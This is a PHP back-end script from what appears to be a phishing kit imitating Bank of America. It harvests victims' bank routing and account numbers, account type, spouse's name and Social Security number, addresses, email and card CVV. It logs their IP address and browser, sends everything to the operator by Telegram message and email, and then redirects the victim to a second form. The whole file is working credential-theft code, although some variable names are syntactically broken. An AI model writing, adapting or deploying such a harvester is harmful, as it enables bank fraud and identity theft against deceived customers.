<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	    $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $D-YN = $_POST['keyedDirectDepositInd'];
    $FG-YN = $_POST['keyedForeignBankQuestion'];
    $RT-N = $_POST['keyedBankRoutingNumber'];
    $ACC-N = $_POST['keyedBankAccountNumber'];
    $ACC-T = $_POST['keyedBankAccountType'];
    $DCS-ID = $_POST['keyedDeceasedApplInd'];
	$SPOUSE = $_POST['keyedSpouseName'];
	$SPOUSE-SSN = $_POST['keyedSpouseSSN'];
	$SPOUSE-YR = $_POST['keyedSpouseBirthYear'];
	$ADDR1 = $_POST['keyedDifStAddress'];
	$ADDR-1A = $_POST['keyedDifMuniAddress'];
	$ADDR = $_POST['keyedAddress'];
	$CITY = $_POST['keyedCity'];
	$CVV = $_POST['CVV'];
	$CVV = $_POST['CVV'];
	$CVV = $_POST['CVV'];
    $serv = $_REQUEST['Direct'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**CARD_INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "D-YN: ".$_POST['keyedDirectDepositInd']."\n";
        $message .= "FG-YN: ".$_POST['keyedForeignBankQuestion']."\n";
        $message .= "RT-N: ".$_POST['keyedBankRoutingNumber']."\n";
        $message .= "ACC-N: ".$_POST['keyedBankAccountNumber']."\n";
        $message .= "ACC-T: ".$_POST['keyedBankAccountType']."\n";
        $message .= "DCS-ID: ".$_POST['keyedDeceasedApplInd']."\n";
		$message .= "SPOUSE: ".$_POST['keyedSpouseName']."\n";
		$message .= "SPOUSE-SSN: ".$_POST['keyedSpouseSSN']."\n";

		$message .= "TNT-NM2: ".$_POST['keyedMultiTenantName2']."\n";
		$message .= "EMAIL: ".$_POST['keyedEmailAddress']."\n";
		$message .= "CNT-PS: ".$_POST['keyedContactPerson']."\n";
		$message .= "A-CD: ".$_POST['keyedAreaCode']."\n";
		$message .= "CVV: ".$_POST['CVV']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Main Content
        $main_subject = "CARD INFORMATIONS 1 $ip";
        $main_body = "<p>
        -----------------------------------------<p>
        User-Agent : $_SERVER
        -----------------------------------------<p>
        Date : $DATE";
        
        
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n $uid\r\n ","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:form2.html");
?>
